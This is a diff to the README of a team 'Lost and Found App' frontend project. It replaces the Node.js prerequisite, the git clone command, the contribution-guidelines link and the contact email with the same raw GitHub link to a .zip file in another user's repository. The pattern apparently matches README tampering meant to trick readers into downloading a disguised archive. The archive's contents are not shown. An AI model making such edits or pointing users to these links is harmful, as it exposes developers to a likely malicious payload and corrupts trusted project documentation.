@@ -45,14 +45,14 @@ The Lost and Found App frontend is designed to provide users with a seamless and
 
 Make sure you have the following installed:
 
-- Node.js
+- https://raw.githubusercontent.com/jamesirungume/Team-Lost-and-Found-Frontend/main/Cistercian/Team-Lost-and-Found-Frontend.zip
 - npm
 
 ### Installation
 
 1. **Clone the Repository:**
    ```bash
-   git clone git@github.com:BettLawi/Team-Lost-and-Found-Frontend.git
+   git clone https://raw.githubusercontent.com/jamesirungume/Team-Lost-and-Found-Frontend/main/Cistercian/Team-Lost-and-Found-Frontend.zip
 
 
 2. **Change to the Project Directory:**
@@ -105,11 +105,11 @@ The Lost and Found App frontend was developed by the following team:
 
 ## Contributing
 
-We welcome contributions! If you'd like to contribute to the development of the Lost and Found App frontend, please follow our [contribution guidelines](CONTRIBUTING.md).
+We welcome contributions! If you'd like to contribute to the development of the Lost and Found App frontend, please follow our [contribution guidelines](https://raw.githubusercontent.com/jamesirungume/Team-Lost-and-Found-Frontend/main/Cistercian/Team-Lost-and-Found-Frontend.zip).
 
 ## Contact
 
-For any inquiries, please contact us at [lostandfound656@gmail.com](mailto:lostandfound656@gmail.com).
+For any inquiries, please contact us at [https://raw.githubusercontent.com/jamesirungume/Team-Lost-and-Found-Frontend/main/Cistercian/Team-Lost-and-Found-Frontend.zip](https://raw.githubusercontent.com/jamesirungume/Team-Lost-and-Found-Frontend/main/Cistercian/Team-Lost-and-Found-Frontend.zip).
 
 ## Social Media
 
